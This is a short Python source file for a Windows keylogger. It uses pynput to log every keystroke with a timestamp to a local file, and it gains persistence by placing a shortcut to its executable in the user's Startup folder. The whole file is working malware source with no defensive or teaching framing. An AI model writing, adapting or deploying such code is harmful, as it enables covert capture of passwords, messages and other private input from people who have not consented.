from pynput import keyboard
from datetime import datetime
import getpass
import shutil
import os.path
import winshell
import win32com.client
import threading

class KeyLogger:
    def __init__(self):
        self.user = getpass.getuser()
        self.startupDir = winshell.startup()

    def create_shortcut(self):
        if os.path.isfile("main.exe"):
            path = os.path.join(self.startupDir, "main.lnk")
            target = r"main.exe"
            winshell.CreateShortcut(Path=path, Target=target)
        else:
            print("(!) .EXE file missing.")
    def check_startup(self):
        path = os.path.join(self.startupDir, "main.lnk")
        exist = os.path.isfile(path)
        return exist

    def enable_startup(self):
        if not self.check_startup():
            self.create_shortcut()

    def on_press(self, key):
        time = datetime.now().replace(microsecond=0)
        with open("logs.txt", "a+") as f:
            f.write(f"{time} | {key}\n")


    def key_listener(self):
        with keyboard.Listener(on_press=self.on_press) as kl:
            kl.join()

if __name__ == "__main__":
    Logger = KeyLogger()
    threading.Thread(target=Logger.enable_startup())
    Logger.key_listener()
